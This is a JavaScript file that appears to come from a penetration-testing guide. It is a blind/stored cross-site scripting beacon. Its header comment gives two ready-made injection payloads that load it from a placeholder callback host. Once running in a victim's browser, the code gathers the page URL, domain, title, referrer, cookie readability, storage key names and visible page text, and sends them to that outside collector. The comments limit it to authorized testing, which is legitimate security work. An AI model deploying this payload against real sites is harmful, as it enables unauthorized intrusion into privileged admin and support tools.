/*
 * blind_xss.js — Blind/stored XSS landing beacon (guide §13).
 * Goal: when a payload fires in a UI you CAN'T see (admin/support/log tool), this reports
 * WHERE it executed so you can identify the privileged context and escalate (guide §32).
 *
 * AUTHORIZED TESTING ONLY. Reports context metadata to YOUR collaborator; it does not
 * exfiltrate other users' sensitive records. Tag each injection location so the callback
 * tells you which input fired (see CFG.loc).
 *
 * Deliver via, e.g.:   <script src="//YOUR.oast.fun/blind_xss.js"></script>
 *                      "><img src=x onerror="import('//YOUR.oast.fun/blind_xss.js')">
 */
(function () {
  var CFG = {
    collector: "//YOUR.oast.fun/b",   // your callback host
    loc: "UNSET"                        // set per-injection, e.g. "ticket-subject" / "ua-header"
  };

  function collect() {
    var data = {
      loc: CFG.loc,
      url: location.href,
      origin: location.origin,
      domain: document.domain,
      title: document.title,
      referrer: document.referrer,
      cookiePresent: !!document.cookie,           // presence only — do not dump others' cookies
      cookieHttpOnlyHint: document.cookie === "" ? "maybe-httponly" : "readable",
      localStorageKeys: safeKeys(window.localStorage),
      sessionStorageKeys: safeKeys(window.sessionStorage),
      // A short DOM snapshot helps identify the admin tool WITHOUT scraping records:
      h1: textOf("h1"),
      navText: textOf("nav"),
      userAgent: navigator.userAgent,
      screen: screen.width + "x" + screen.height
    };
    return data;
  }

  function safeKeys(store) {
    try { return Object.keys(store); } catch (e) { return []; }
  }
  function textOf(sel) {
    try { var el = document.querySelector(sel); return el ? el.textContent.slice(0, 120) : ""; }
    catch (e) { return ""; }
  }

  function beacon(obj) {
    var body = JSON.stringify(obj);
    try {
      navigator.sendBeacon(CFG.collector, body);
    } catch (e) {
      new Image().src = CFG.collector + "?d=" + encodeURIComponent(body);
    }
  }

  try { beacon(collect()); } catch (e) { new Image().src = CFG.collector + "?err=" + encodeURIComponent(String(e)); }
})();
